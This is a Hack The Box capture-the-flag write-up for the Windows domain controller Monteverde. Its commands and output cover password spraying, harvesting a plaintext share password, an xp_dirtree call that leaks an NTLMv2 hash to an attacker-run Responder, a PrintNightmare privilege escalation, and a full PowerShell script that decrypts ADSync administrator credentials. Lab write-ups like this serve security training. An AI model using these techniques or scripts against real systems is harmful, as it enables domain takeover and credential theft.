# Key Takeaways
- When password spraying, it is usually worth trying the username as the password to look for easy wins (user.txt).
- If permissions are available and Azure AD is in use, look to Azure AD + ADSync for possible credentials/vulnerabilities (root.txt).

# Overview
- Platform: Windows
- HTB Rating: Medium

### Vulnerabilities
- Weak password policy (allowing the username as the password) allows for easy initial access.
- Anonymous (Null) SMB sessions allows for enumeration of domain users, leading to a compromised account via password spraying.
- A (weakly protected) network share contains sensitive credentials for a user account, allowing remote access.
- A Lack of updates allows older CVEs to be used to escalate privileges on the Domain Controller.
- Membership to the Azure Admins group allows for access to the ADSync database, and further credential extraction.
- Overly permissive MSSQL Server permissions allows for users to utilize `xp_dirtree`, disclosing the Monteverde machine account NTLMv2 hash to attackers.

### Strengths
- There are no accounts setup with Kerberos pre-auth, or given SPNs, preventing AS-REP and Kerberoasting attacks.


# Solving user.txt
The machine was begun with a basic nmap scan to start looking for interesting services.
```
└──╼ $sudo nmap -sS -A -v -oA top1000 --top-ports 1000 10.10.10.172
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-14 03:01:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

It was found that the domain we are enumerating here is likely `megabank.local`.

```
└──╼ $sudo nmap -sS -oA alltcp -p- 10.10.10.172
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-13 22:02 EST
Nmap scan report for 10.10.10.172
Host is up (0.040s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49693/tcp open  unknown
```

Right away, I was interested in seeing if we can extract any information from the open ports for SMB (445) or DNS (53). DNS didn't return anything particularly useful.
```
└──╼ $dig any megabank.local @10.10.10.172
; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any megabank.local @10.10.10.172
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49599
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;megabank.local.                        IN      ANY

;; ANSWER SECTION:
megabank.local.         600     IN      A       10.10.10.172
megabank.local.         3600    IN      NS      monteverde.megabank.local.
megabank.local.         3600    IN      SOA     monteverde.megabank.local. hostmaster.megabank.local. 50 900 600 86400 3600
megabank.local.         600     IN      AAAA    dead:beef::2dbe:bf36:8e26:db76

;; ADDITIONAL SECTION:
monteverde.megabank.local. 3600 IN      A       10.10.10.172
monteverde.megabank.local. 3600 IN      AAAA    dead:beef::20d6:3131:3ad3:cba4

;; Query time: 43 msec
;; SERVER: 10.10.10.172#53(10.10.10.172) (TCP)
;; WHEN: Tue Jan 13 22:03:12 EST 2026
;; MSG SIZE  rcvd: 203

[22:03:12] ┌─[bored@parrot]─[~]
└──╼ $dig axfr megabank.local @10.10.10.172

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr megabank.local @10.10.10.172
;; global options: +cmd
; Transfer failed.
```

I then turned my attention to SMB, noting that while we can't list any shares anonymously, we do get a successful connection.
```
└──╼ $smbclient -N -L \\\\10.10.10.172
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

With this information, I then attempted to extract more information via an RPC null session, which was successful. We are able to retrieve a list of valid domain user accounts, alongside domain and password policy information.
```
└──╼ $rpcclient -U "" -N 10.10.10.172
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000000
rpcclient $> querydominfo
Domain:         MEGABANK
Server:
Comment:
Total Users:    51
Total Groups:   0
Total Aliases:  23
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

I pasted this list into a file (fullusers.txt) and then turned that into just a list of account names via sed:
```
cat fullusers.txt | sed -n 's/.*user:\[\([^]]*\)\].*/\1/p' > users.txt
```

I then looked to see if any of these accounts had Kerberos pre-authentication enabled (AS-REP Roasting), however that didn't prove to be helpful.
```
└──╼ $GetNPUsers.py megabank.LOCAL/ -dc-ip 10.10.10.172 -no-pass -usersfile users.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Next, I started spraying some passwords at these accounts to see if any had a weak password set.
```
└──╼ $nxc smb 10.10.10.172 -u users.txt -p Welcome1 --continue-on-success | grep +
```

Having no luck with some basic weak passwords, I attempted another spray using the usernames also as the password. This gives us a successful credential pair as the user `SABatchJobs`.
```
└──╼ $nxc smb 10.10.10.172 -u users.txt -p users.txt --no-bruteforce --continue-on-success | grep +
SMB                      10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Noting from the nmap scan that WinRM was likely available for remote access, I attempted to log in as this user. We unfortunately do not have permissions to do so.
```
└──╼ $evil-winrm -i 10.10.10.172 -u SABatchJobs -p SABatchJobs
Evil-WinRM shell v3.5

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

I then re-enumerated the SMB shares, but this time with our valid credentials. It is found that we have read access to a bunch of shares.
```
└──╼ $nxc smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

I then used Netexec to spider through these shares so that I can see if we have access to any interesting files.
```
└──╼ $nxc smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -M spider_plus
<SNIP>
└──╼ $cat 10.10.10.172.json
{
    "NETLOGON": {},
    "SYSVOL": {
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-03 07:47:23",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-03 07:47:23",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-03 07:47:23",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-03 07:47:23",
            "size": "1.07 KB"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2020-01-02 17:17:56",
            "ctime_epoch": "2020-01-02 17:17:56",
            "mtime_epoch": "2020-01-02 17:17:56",
            "size": "2.73 KB"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-02 17:26:34",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-02 17:26:34",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-02 17:26:34",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-02 17:26:34",
            "size": "4.43 KB"
        }
    },
    "azure_uploads": {},
    "users$": {
        "mhope/azure.xml": {
            "atime_epoch": "2020-01-03 08:41:18",
            "ctime_epoch": "2020-01-03 08:39:53",
            "mtime_epoch": "2020-01-03 09:59:24",
            "size": "1.18 KB"
        }
    }
}
```

The users$\mhope\azure.xml file looked quite interesting and non-standard, so I connected to the share, downloaded it, and read it. The XML file seems to have powershell commands that would create an Azure AD Credential, and contains a password of some kind. It is likely that this could be a password to log in as `mhope`.
```
└──╼ $smbclient -U megabank.local/SABatchJobs \\\\10.10.10.172\\users$
Password for [MEGABANK.LOCAL\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (6.9 KiloBytes/sec) (average 6.9 KiloBytes/sec)
smb: \mhope\> exit

└──╼ $cat azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

I attempted to log in via WinRM again, this time using the credentials found: `mhope : 4n0therD4y@n0th3r$`. I got a successful connection, and grabbed the user.txt flag.
```
└──╼ $evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
c75bcc8e8716cc14a038e2c48bc1f171
```

# Solving root.txt (less interesting way)
I want to note before getting into this section that I did not have knowledge of ADSync vulnerabilities before going into this box, and found another way to gain root privileges before exploring that route. This section will be what route I took first (not the more likely intended route of using the Azure Admins group membership).

With access to the MONTEVERDE machine as the user `mhope`, it was now time to look for a way to escalate privileges. I began by looking at our basic user privileges, groups, and ran BloodHound.
```
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

```
*Evil-WinRM* PS C:\Users\mhope\Documents> upload SharpHound_v1.exe

Info: Uploading SharpHound_v1.exe to C:\Users\mhope\Documents\SharpHound_v1.exe

Data: 1402880 bytes of 1402880 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> .\SharpHound_v1.exe -c All --zipfilename megabank
<SNIP>
 79 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-01-13T21:29:32.6557144-08:00|INFORMATION|SharpHound Enumeration Completed at 9:29 PM on 1/13/2026! Happy Graphing!
*Evil-WinRM* PS C:\Users\mhope\Documents> dir


    Directory: C:\Users\mhope\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2026   9:29 PM          13604 20260113212931_megabank.zip
-a----        1/13/2026   9:29 PM          11927 MmU4ODNmNTctYjM2MS00N2U1LWI5NjctNDg2N2E5YmZmZmEx.bin
-a----        1/13/2026   9:28 PM        1052160 SharpHound_v1.exe


*Evil-WinRM* PS C:\Users\mhope\Documents> download 20260113212931_megabank.zip
```

From this information, I noted that we do have interesting (and non-standard) Azure Admins group membership, but wasn't 100% sure what that meant yet. None of the other information was super helpful.

I then looked at what network services were running, noting that there seems to be a SQL Server running on the standard port (1433).
```
*Evil-WinRM* PS C:\Users\mhope\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3644
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1848
```

After noting that the sqlcmd tool was available on the machine, I used this to verify if we had access to the server. We did have access with the Windows credentials.
```
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -S localhost -E -q "SELECT @@version;"

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2017 (RTM-GDR) (KB4505224) - 14.0.2027.2 (X64)
        Jun 15 2019 00:26:19
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)


(1 rows affected)
```

I then attempted to see if we could escalated privileges via xp_cmdshell, however we did not have the permission to enable that. I did however note that we could use `xp_dirtree`. I used this to "authenticate" against my local machine and grab the `MONTEVERDE$` machine account NTLMv2 hash.

```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server> sqlcmd -S localhost -E -q "EXEC master..xp_dirtree '\\10.10.10.10\share\'"
```

```
└──╼ $sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

<SNIP>

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.10.172
[SMB] NTLMv2-SSP Username : MEGABANK\MONTEVERDE$
[SMB] NTLMv2-SSP Hash     : MONTEVERDE$::MEGABANK:dc8fc7428422a718:014157F98C4A2AFCA801B5715B9D9460:010100000000000000E00770A385DC0154FD62FF247CC9AF0000000002000800300034004200590001001E00570049004E002D003700540049004D00560036004B00380033004800330004003400570049004E002D003700540049004D00560036004B0038003300480033002E0030003400420059002E004C004F00430041004C000300140030003400420059002E004C004F00430041004C000500140030003400420059002E004C004F00430041004C000700080000E00770A385DC01060004000200000008003000300000000000000000000000003000007B376B511946D65C802B6D75CA20632A8230F55AC652D4E64F2881848FE738AA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000
```

However, unsurprisingly, this NTLMv2 was unable to be cracked with basic wordlists, thus I moved on to other options.

Noting from the previous MSSQL Server `@@version` command that we were on a Windows Server 2019 OS, I decided to see if we could use a more documented privileged escalation vector, such as [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675). I first checked to see if the print spooler service was running and potentially vulnerable.
```
└──╼ $rpcdump.py @10.10.10.172 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

Based on the vulnerability information, this response is a sign that the machine may be vulerable. I then transfered the exploit code and executed it. This was successful and I was able to add a user `hacked` with local administrator privileges.
```
*Evil-WinRM* PS C:\Users\mhope\Documents> upload ../../tools/Windows/CVE-2021-1675.ps1

Info: Uploading ../../tools/Windows/CVE-2021-1675.ps1 to C:\Users\mhope\Documents\CVE-2021-1675.ps1

Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> Set-ExecutionPolicy Bypass -Scope Process
*Evil-WinRM* PS C:\Users\mhope\Documents> Import-Module .\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> Invoke-Nightmare -NewUser "hacked" -NewPassword "Password123!" -DriverName "PrintIt"
[+] created payload at C:\Users\mhope\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_9543832f82bb474f\Amd64\mxdwdrv.dll"
[+] added user hacked as local administrator
[+] deleting payload from C:\Users\mhope\AppData\Local\Temp\nightmare.dll
```

I then utilized psexec.py to log in as the user with system privileges and retrieve the root.txt flag.
```
└──╼ $psexec.py megabank.local/hacked:Password123!@10.10.10.172
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.10.172.....
[*] Found writable share ADMIN$
[*] Uploading file VsyCzCEk.exe
[*] Opening SVCManager on 10.10.10.172.....
[*] Creating service LKFg on 10.10.10.172.....
[*] Starting service LKFg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.914]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
00ec8f39089505d19dfec8aad0d3209b
```

# Solving root.txt (Azure AD)
After a glance at a write-up mentioning a separate way to gain access to the administrator account, I went back to the machine to figure out how that works. I started with the SQL Server instance, as I didn't end up fully enumerating that. A look at what databases we have access to shows that there is a non-standard `ADSync` database.

```
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -S MONTEVERDE -Q "SELECT name FROM master.sys.databases;"
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
ADSync
```

I then started looking for information on this as I had no idea what table to look in from here. A Google search of "ADSync Vulnerability" turns up some interesting articles, [this](https://blog.xpnsec.com/azuread-connect-for-redteam/) one goes over numerous potential vulnerabilities.

The article notes that the ADSync database contains encrypted credentials for the ADSync account within the `mms_management_agent` table. To decrypt the credentials, the database passes 3 pieces of information to the `mcrypt.dll` file found in the ADSync installation directory.
1. keyset_id
2. instance_id
3. entropy

All of these can be found within the table `mms_server_configuration`. That said, the article contains a powershell script that can be used to decrypt the credentials for us (but requires a small tweak).
```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

I copied this onto the machine and tried running it, however it hung for awhile and then returned an error.
```
*Evil-WinRM* PS C:\Users\mhope\Documents> .\azuread_decrypt_msol.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 3221225477]: <f:WSManFault Code='3221225477' Machine='10.10.10.172' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message><f:ProviderFault path='C:\Windows\system32\pwrshplugin.dll' provider='microsoft.powershell'/></f:Message></f:WSManFault>

Error: Exiting with code 1
```

After re-reading the article, I noticed that the author was using the `SqlLocalDb.exe` tool, however our installation seems to be a bit different as we do not have this tool located in the mentioned directory: `C:\Program Files\Microsoft SQL Server\110\Tools\Binn\`. This means that more than likely, the connection string within the PowerShell script simply isn't using proper syntax to connect to the DB. I referenced [this](https://www.connectionstrings.com/sql-server/) MSSQL Server documentation to find what connection string might work and decided to use: `Server=myServerAddress;Database=myDataBase;Trusted_Connection=True;`.

I confirmed the server name via the following command.
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> sqlcmd -S localhost -E -q "SELECT @@SERVERNAME"

--------------------------------------------------------------------------------------------------------------------------------
MONTEVERDE
```

I then filled in the name of the database we will be using, `ADSync`, and then replaced the old connection string in the script with our new one: `Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true`.

This resulted in the following script:
```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

I then transferred the script and ran it on the machine, which returned the administrator credentials.
```
*Evil-WinRM* PS C:\Users\mhope\Documents> .\testadconnect.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
